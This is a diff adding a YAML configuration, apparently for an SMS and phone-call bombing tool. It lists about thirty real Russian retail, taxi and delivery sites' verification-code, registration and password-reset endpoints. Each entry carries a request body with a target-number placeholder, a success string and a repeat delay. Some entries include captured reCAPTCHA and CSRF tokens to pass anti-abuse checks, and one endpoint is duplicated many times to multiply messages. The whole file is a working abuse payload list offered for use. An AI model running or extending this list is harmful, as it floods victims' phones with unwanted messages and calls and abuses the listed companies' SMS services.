@@ -1,0 +1,267 @@
+﻿smsServices:
+# ----------------
+# TEST "SERVICE"
+# - url: 'https://httpbin.org/post'
+#   method: 'POST'
+#   headers:
+#     Content-Type: 'application/json'
+#   body: '{"phone_number":"<num>"}'
+#   okRes: 'origin'
+#   delay: 5
+# ----------------
+
+- url: 'https://apteka366.ru/login/register/sms/send'
+  method: 'POST'
+  body: 'phone=<num2>'
+  okRes: '{"phone":"'
+  delay: 121
+
+- url: 'https://belkacar.ru/get-confirmation-code'
+  method: 'POST'
+  body: 'phone=<num>'
+  okRes: 'success":true'
+  delay: 61
+
+- url: 'https://drugvokrug.ru/siteActions/processSms.htm'
+  method: 'POST'
+  body: 'cell=<num>'
+  okRes: 'success":true'
+  delay: 7
+
+- url: 'https://lenta.com/api/v1/registration/requestValidationCode'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"<num3>"}'
+  okRes: '{"phoneNumber":"<num>","nextTryAllowedAt":"2021-10-21T19:35:59Z"}'
+  delay: 63
+
+- url: 'ttps://passport.yandex.ru/registration-validations/phone-confirm-code-submit'
+  method: 'POST'
+  headers:
+  body: 'track_id=f8a5c9e78c0f7e89193f2365cab271b22c&csrf_token=b82cbf14df583a77db616be1c8575b9f0f05048f%3A1634845180360&display_language=ru&number=<num>&confirm_method=by_sms&isCodeWithFormat=true'
+  okRes: '{"phoneNumber":"","nextTryAllowedAt":"2021-10-21T19:35:59Z"}'
+  delay: 63
+
+- url: 'https://api.eapteka.ru/api/v3/user'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"+<num3>","force_sms":true}'
+  okRes: ''
+  delay: 63
+
+- url: 'https://www.okeydostavka.ru/wcs/resources/mobihub023/store/13159/loyalty/profile/profile'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"profile":{"firstName":"Пицос","lastName":"Дебил","email":"mymail@mail.com","phone":"<num>","birthday":"1955-01-01","middleName":"Соси","genderCode":"1","password":"psq1111111111","allowPersonalDataProcessing":"true","allowEmail":"true","allowSms":"true","allowEReciept":"true"}}'
+  okRes: ''
+  delay: 63
+
+- url: 'https://api.metro-cc.ru/auth/api/v1/public/send_otp'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"<num>"}'
+  okRes: '{"result":"success"}'
+  delay: 63
+
+- url: 'https://lkk.verno-info.ru/#/reset-password'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"notifierIdentity":"<num>"}'
+  okRes: '{
+  "data": {
+    "codeLength": 6
+  },
+  "result": {
+    "state": "Success",
+    "message": "Код подтверждения отправлен на указанное средство оповещения.",
+    "messageCode": null,
+    "exception": null,
+    "validationErrors": null
+  }
+}'
+  delay: 1
+
+- url: 'https://www.kfc.ru/api/account/verify'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"+7 <num2>","g-recaptcha-response":"03AGdBq26UG2S2ss2CP6CGyYtrM4B0J2MtKfq5oCmJMMnQ7rul2mJsVCuCrQRerqX43Sgw4xFnyl5B9Lm68YcCMOu44gbURdih_zCx2Fu1whwmAE2RJ2XEWs3ymb1mCv5QIuElXH2OHAIZflBZEm6yRl27Hp2eigiK5Lrf4P_55u_nHsVGl18XDiQc-yNj3n9yYF3yJHwaCp-lvgfH7FcT7bGDimziZieTmzzpmLcfkpBIcCHO-VQJ5a9z8VRO0knzjbsqNHLEl46XNDY2AOreL0MGaweV2Ep6hqh-QilMS6w8PkrQu8o77ne4NeJoTS1QZD0U0yCZW8RsbAC2rcKOH7zMpaB0A1-v_HM4QpniCcYF6yWehllFAxDw4yP0gOOod2dFyjS_FUaY74lUKkBU7F0HHOhFZocV2dPyKJh_HAagJawmQZSjwSclYqXd-Uqeeds1SAdK3ATEOeMm7qSvwFEtKEg-ROnZaHNCVs8so7E4cQik5bgQhDNhF0nzarhdL-4IoOerL6_l"}'
+  okRes: '{"status":0}'
+  delay: 63
+
+- url: 'https://site-api.mcdonalds.ru/api/v1/user/login/phone'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"number":"+<num>","g-recaptcha-response":"03AGdBq25fCO2oHw2TSEp5WZc91mGXJE74Gce6Zd-gAucDEN9GwrQZykCd1xdsJICfHAp9jqpbPGT5UnXZwk6T3z_MJ2IGEv5zD40w3SR-7q8UVCfxmGiDyaWD86fTQX4IfTLNcEyBsejb2-NKB3q6yC4eVwipNtZFFan5fxDMTGeZCsdGTPHfjk1RDpdV4fWnHajLgQ4xjVJA_Dc8mlHZxeu7uBprq8npd4_zRAUxfWnU_JTzek3zIUpIFKftg7ufmVzUbnQPviO8l2wptElEclFyd8-GoPJGnBuprLkpt-JtFa2NJKmkmLnV2LU-7HGrZkXv8yFOFKsJKRnWGpJxOQYmh-lBxMAme8v0S7m98UG_dSf4KHUUvf-ZqsRvs-Sd0HHLlB7oEZkmGeIbJkNtgz46KEgcw0kEdennTfyCOaP_d7MwWlklETHMcFSY7vn62ZcYvZbrS55FOVyT6L-eLQfyHnI5dOz8d0km0BKB_TJDnH6-CjdGwgE9SZQqjxuBEyfeQjeyDmLH"}'
+  okRes: ''
+  delay: 32
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+
+- url: 'https://www.dns-shop.ru/auth/auth/fast-authorization/'
+  method: 'POST'
+  headers:
+  body: '------WebKitFormBoundaryoLmYJtNQAZLgio2W
+Content-Disposition: form-data; name="FastAuthorizationLoginLoadForm[login]"
+
+<num>
+------WebKitFormBoundaryoLmYJtNQAZLgio2W
+Content-Disposition: form-data; name="FastAuthorizationLoginLoadForm[token]"
+
+
+------WebKitFormBoundaryoLmYJtNQAZLgio2W--'
+  okRes: '{"result":true,"errorType":null,"errors":[],"errorCode":null,"authResponse":null,"message":"","data":{"wasSend":true,"secondsBeforeResending":120,"needCaptchaToken":false,"lockReason":"","error":""}}'
+  delay: 123
+
+
+- url: 'https://admin.taxovichkof.ru/api/account/get_password'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_phone":"+7 <num>"}'
+  okRes: '{"success":true,"message":"\u041f\u0430\u0440\u043e\u043b\u044c \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d \u043d\u0430 \u0443\u043a\u0430\u0437\u0430\u043d\u044b\u0439 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430!"}'
+  delay: 63
+
+
+- url: 'https://client.taximaxim.com/ru-RU/site/send-code/'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '_csrf=mHbLHw9pYL0Yu-aY_KN6HvUjt3-_2-jUeYsxJFVyJvyvL7h8PSIV2myW1frKxShzt1f-OOaDga4R2kdRE0tvsQ%3D%3D&LoginForm%5Borg%5D=maxim&LoginForm%5Bcountry%5D=RU&LoginForm%5BbaseId%5D=133&LoginForm%5BsendCodeType%5D=0&LoginForm%5Bphone%5D=%2B<num9>&LoginForm%5Bagree%5D=1'
+  okRes: '{"success":true,"message":"Код отправлен на указанный вами номер.","data":{"message":"Код отправлен на указанный вами номер.","success":true,"nextTryInSeconds":60},"errors":[],"rateLimited":null}'
+  delay: 63
+
+
+- url: 'https://dostavista.ru/user/send-sms'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"<num7>","source":"signup"}'
+  okRes: '{"is_successful":true,"session":"eyJuYW1lc3BhY2UiOiJjbGllbnRfYXBpIiwicmVnaW9uX2lkIjoxMX0.rOFg9IwNwi9g4Sew0zaOt8Pvz7HKet6uUUc1Bk8_XY4.940976f005","server_datetime":"2021-10-22T08:12:38+03:00"}'
+  delay: 33
+
+- url: 'https://www.avito.ru/events/add'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"version":2,"eid":2077,"phone":"+<num7>","s":"registration","ref_id":"b0dc3c49-94d0-4b6e-8d63-2e30330c921d","parent_ref_id":"68c3ee89-01d6-48a2-864d-609061f33ed8","tab_id":"22629691-fe22-4351-8b76-0243e60a0fd4"}'
+  okRes: ''
+  delay: 63
+
+- url: 'https://3332222.ru/phone/va11date'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone":"+<num3>"}'
+  okRes: '{"result":"success","message":"Code sended"}'
+  delay: 63
+
+- url: 'https://2-berega.ru/api/shop/auth/client/password/temporary/request?showcase=1&regionId=24841358-2f14-11e3-82a9-005056ae58ca&language=ru&mobilePhone=79111434342'
+  method: 'POST'
+  headers:
+  body: 'showcase=1&regionId=24841358-2f14-11e3-82a9-005056ae58ca&language=ru&mobilePhone=<num>'
+  okRes: '{"message":"ok"}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"user_login":"<num4>"}'
+  okRes: '{"backurl":"\/index.php?login=yes","success":false,"data":false,"status":10,"captcha":0}'
+  delay: 63
+
+- url: 'https://eda.yandex/api/v1/user/request_authentication_code'
+  method: 'POST'
+  headers:
+    Content-Type: 'application/json'
+  body: '{"phone_number":"<num2>"}'
+  okRes: '"delay"'
+  delay: 61
+
+- url: 'https://youla.ru/web-api/auth/request_code'
+  method: 'POST'
+  body: 'phone=<num>'
+  okRes: '"phone"'
+  delay: 16
+
+- url: 'https://www.citilink.ru/registration/confirm/phone/+<num>/'
+  method: 'POST'
+  body: ''
+  okRes: '"smsRequestToken":'
+  delay: 61
+
+
+callServices:
+- url: 'https://findclone.ru/register?phone=+<num>'
+  method: 'GET'
+  okRes: '"pin_size"'
+  delay: 61
+
+- url: 'https://client.taximaxim.com/ru-RU/site/send-code/'
+  method: 'POST'
+  headers:
+  body: '_csrf=t0T20Uzq6471RBB6Yvfj-mMGFDWWHPGKgGpIRGH3pTCAHYWyfqGe6YFpIxhUkbGXIXJdcs9EmPDoOz4xJ87sfQ%3D%3D&LoginForm%5Borg%5D=maxim&LoginForm%5Bcountry%5D=RU&LoginForm%5BbaseId%5D=133&LoginForm%5BsendCodeType%5D=2&LoginForm%5Bphone%5D=%2B<num9>&LoginForm%5Bagree%5D=1'
+  okRes: '{"success":true,"message":"Звоним...\r\nПоследние 4 цифры номера телефона поступившего звонка нужно ввести в поле «Код».","data":{"message":"Звоним...\r\nПоследние 4 цифры номера телефона поступившего звонка нужно ввести в поле «Код».","success":true,"nextTryInSeconds":60},"errors":[],"rateLimited":null}'
+  delay: 61
